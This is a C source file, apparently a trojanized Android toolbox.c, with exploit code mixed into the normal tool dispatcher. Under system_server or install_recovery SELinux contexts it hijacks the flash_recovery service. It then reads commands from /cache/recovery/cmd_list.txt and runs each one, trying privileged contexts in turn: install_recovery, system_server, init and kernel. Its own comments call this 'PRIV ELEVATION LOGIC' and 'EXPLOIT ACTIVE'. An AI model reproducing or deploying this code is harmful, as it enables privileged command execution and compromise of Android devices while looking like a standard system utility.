/* begin default toolbox.c headers, 3 total */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
/* end default toolbox.c headers, 3 total */

//headers added to support exploit
#include<sys/wait.h>
#include <sys/types.h>
#include <unistd.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>
#include <signal.h>
#include <errno.h>

#include "shared.h"

typedef char *security_context_t;
#define _file_cmdlist "/cache/recovery/cmd_list.txt"

void eXecCmd(char *);
void  parse(char *, char **);
void exitreason(pid_t, int);
void  execute(char **argv);

//toolbox function definitions
int main(int, char **);

static int toolbox_main(int argc, char **argv)
{
    // "toolbox foo ..." is equivalent to "foo ..."
    if (argc > 1) {
        return main(argc - 1, argv + 1);
    } else {
        printf("!Toolbox!\n");
        return 0;
    }
}

#define TOOL(name) int name##_main(int, char**);
#include "tools.h"
#undef TOOL

static struct 
{
    const char *name;
    int (*func)(int, char**);
} tools[] = {
    { "toolbox", toolbox_main },
#define TOOL(name) { #name, name##_main },
#include "tools.h"
#undef TOOL
    { 0, 0 },
};

static void SIGPIPE_handler(int signal) {
    // Those desktop Linux tools that catch SIGPIPE seem to agree that it's
    // a successful way to exit, not a failure. (Which makes sense --- we were
    // told to stop by a reader, rather than failing to continue ourselves.)
    _exit(0);
}

int main(int argc, char **argv)
{
	//default toolbox variables
    int i;
    char *name = argv[0];


	//saves current context
	security_context_t currcon;

	security_context_t SERVER_CONTEXT = "u:r:system_server:s0";
	security_context_t INSTALL_CONTEXT = "u:r:install_recovery:s0";

	getcon(&currcon);

														/* we will capture a root + system_server process, then fork it */
								if( !strcmp(SERVER_CONTEXT, currcon) && increment_value(0, RSF_TOOLBOX_RUN_ONCE) ) { /* I expect current value of 0, otherwise return false */
																			
												/* if system_server context && increment did't return 0 we will be here */
												LOGV("[+] toolbox running %s as uid: %d, gid: %d, context %s", argv[0], getuid(), getgid(), currcon);

														
								
								//LOGV("[*] toolbox property_set flash_recovery pid:%i",getpid());
								property_set("ctl.start", "flash_recovery");
								
								/* ONLY the first install_recovery will be hijacked, use the same file as system_server but this time set it to 2 */
								/* if current context == install_recovery AND we haven't already increment RSF_TOOLBOX_RUN_ONCE to be value of 2 */
								}else if (!strcmp(INSTALL_CONTEXT, currcon) && increment_value(1, RSF_TOOLBOX_RUN_ONCE) ) {	/* increment rejects if value not currently 1 */							
																			/* if install_recovery context && increment did't return 0 we will be here */
																//LOGV("[*] -=-= EXPLOIT ACTIVE =-=- ");




		// when bridge has sen't cmd_list.txt and any supporting files for our cmd_list.txt this value will be 1 inside the file
		while(check_value(RSF_SENT_FILE_LIST) != 1) {usleep(200);}


	   char *    exec_trimmed_CmdLine; //This is the command line |/system/bin/<binary> <options> <args>|
	   char *	 tmpStr; //dump value
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;
		int ret=1;

			//open the list of cmds
   			FILE *file_ir_cmds = fopen(_file_cmdlist,"r");
   				if (file_ir_cmds == NULL) {
   					return 1;
   				}

//===>[-] Execute the list of commands in consecutive order [-]<===
		while (fgets(line, sizeof(line), file_ir_cmds)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");
//<TODO> finish removing the second loop stuff.
//			ret = strncmp(tmpStr, "-#", 2);
//			if ( ret == 0 ){
				/* -=-=-=-=- call execute on the command line -=-=-=-=-*/
				eXecCmd(exec_trimmed_CmdLine);
//			}


		iCntr++;
		}

	//close the file
	if(file_ir_cmds != NULL)				        
	fclose(file_ir_cmds);
	
		//signal bridge/till/farm that we are done now.	   
		if ( increment_value(1, RSF_SENT_FILE_LIST) ) {}	

} //END OF ELSE IF --- PRIV ELEVATION LOGIC


leave_hack:
if(currcon != NULL)
	free(currcon);    
    
    
    // Let's assume that none of this code handles broken pipes. At least ls,
    // ps, and top were broken (though I'd previously added this fix locally
    // to top). We exit rather than use SIG_IGN because tools like top will
    // just keep on writing to nowhere forever if we don't stop them.
    signal(SIGPIPE, SIGPIPE_handler);

    if((argc > 1) && (argv[1][0] == '@')) {
        name = argv[1] + 1;
        argc--;
        argv++;
    } else {
        char *cmd = strrchr(argv[0], '/');
        if (cmd)
            name = cmd + 1;
    }

    for(i = 0; tools[i].name; i++){
        if(!strcmp(tools[i].name, name)){
            return tools[i].func(argc, argv);
        }
    }

    printf("%s: no such tool\n", argv[0]);
    return -1;
}
//folowing code is 100% exploit code, not part of toolbox.c
//execute commands
void eXecCmd(char *command_line) {
    security_context_t newcontext	=	"u:r:install_recovery:s0";
	if (setcon(newcontext)){}
    int isetcon;

	extern char **environ;										/* array of environment variables */
    char  *arguments[511];              						/* the command line argument      	*/
	parse(command_line, arguments);								/*   parse the line               	*/
		
    	pid_t childprocess;		/* execv doesn't return on success so we need to fork a proc */
    	int status=0;			/* status is updated to parent */
    	
    	int waitoptions = 0;	/* opitions listed below */
    	//WNOHANG    return immediately if no child has exited.
    	//WUNTRACED  also return if a child has stopped (but not traced via ptrace(2)).  Status for traced children which have stopped is provided even if this option is not specified.
    	//WCONTINUED also return if a stopped child has been resumed by delivery of SIGCONT.
    	
    		int res=0;
			int iSaySo=1;
	/* loop through contexts until success or we run out */
	while (iSaySo){
		/* reset on each loop */
    	status=0;
    	waitoptions = 0;
    		res=0;

    				if( (childprocess = fork()) == 0 ) 													/* Child proc block */
    				{


   										switch (iSaySo) /* contexts to try */
    										{
        										case 1: newcontext	=	"u:r:install_recovery:s0";
        										break;
        										case 2: newcontext	=	"u:r:system_server:s0";
        										break;
        										case 3: newcontext	=	"u:r:init:s0";
        										break;
        										case 4: newcontext	=	"u:r:kernel:s0";
        										break;
        										case 5: newcontext	=	"u:r:shell:s0";
        										break;
        										case 6: newcontext	=	"u:r:toolbox:s0";
        										break;
        									   default: iSaySo=0;  /* <TODO> <DEBUG> error should be reported one time, here */
        									}if (!iSaySo){break;}
        									//<TODO> <DEBUG> --- return not tested
        									//if (setcon(newcontext)){}
   			isetcon = setexeccon(newcontext);				/* it's proper to set the exec context before making an exec call */
   			if ( isetcon ) {								/* i've never seen an error feel free to remove this line */
   				LOGV("[-] Toolbox: error setexeccon %s",newcontext);
   			}


    	    			if( (res = execve(*arguments, arguments, environ)) < 0 ) 									/* -=-=->] Execute [<-=-=- */
    	    			{	
//report every error    	    				if (iSaySo == 0 ) {
    	    					LOGV("[-] Toolbox %s [failure: %s]",					/* Report errors */
    	    					     command_line, strerror(errno));
								exitreason(childprocess, status); 						/* on error, test for signal and coredump & report them */
								exit(91); 												/* must exit child on failure because the proc returns */
//    	    				}
    	    			}
    				}
    				else if( childprocess > 0 )
    				{
    	    			waitpid(childprocess, &status, waitoptions);									/* parent, waitfor child */
   	    				if ( !status )LOGV("[+] Toolbox success: %s", command_line);break;				/* if status is 0 we had success */
    				} else {LOGV("[-] Toolbox failed to fork process");}
		iSaySo++;    		
	}    		
}
//parse into a command line
void  parse(char *line, char **arguments)
{
     while (*line != '\0') {       /* if not the end of line ....... */ 
          while (*line == ' ' || *line == '\t' || *line == '\n')
               *line++ = '\0';     /* replace white spaces with 0    */
          *arguments++ = line;          /* save the argument position     */
          while (*line != '\0' && *line != ' ' && 
                 *line != '\t' && *line != '\n') 
               line++;             /* skip the argument until ...    */
     }
     *arguments = '\0';                 /* mark the end of argument list  */
}
//some testing for when there was an error.
void exitreason(pid_t childprocess, int status)
{
    if( WIFSIGNALED(status) )
    {
        LOGV("[-] Toolbox child %d process was terminated by a signal.",childprocess);
        if( WTERMSIG(status) )
        {
        	LOGV("[-] Toolbox child %d signal %d that caused the child process to terminate.",childprocess,WTERMSIG(status));
        }
        if( WCOREDUMP(status) )
        {
        	LOGV("[-] Toolbox child %d produced a core dump",childprocess);
        }
    }
    if( WIFSTOPPED(status) )
    {
        LOGV("[-] Toolbox child %d process was stopped by delivery of a signal (see ptrace(2)).",childprocess);
        if( WSTOPSIG(status) )
        {
        	LOGV("[-] Toolbox child %d number of the signal which caused the child to stop.",childprocess);
        }
    }
}
//WIFEXITED(status) returns true if the child terminated normally, that is, by calling exit(3) or _exit(2), or by returning from main().
//WEXITSTATUS(status) returns the exit status of the child.  This consists of the least significant 8 bits of the status argument that the child specified in a call to exit(3) or _exit(2) or as the argument for a return statement in main().  This macro should only be employed if WIFEXITED returned true.
//WIFSIGNALED(status) returns true if the child process was terminated by a signal.
//WTERMSIG(status) returns the number of the signal that caused the child process to terminate.  This macro should only be employed if WIFSIGNALED returned true.
//WCOREDUMP(status) returns true if the child produced a core dump.  This macro should only be employed if WIFSIGNALED returned true.  This macro is not specified in POSIX.1-2001 and is not available on some UNIX implementations (e.g., AIX, SunOS).  Only use this enclosed in #ifdef WCOREDUMP ... #endif.
//WIFSTOPPED(status) returns true if the child process was stopped by delivery of a signal; this is only possible if the call was done using WUNTRACED or when the child is being traced (see ptrace(2)).
//WSTOPSIG(status) returns the number of the signal which caused the child to stop.  This macro should only be employed if WIFSTOPPED returned true.
//WIFCONTINUED(status) (since Linux 2.6.10) returns true if the child process was resumed by delivery of SIGCONT.
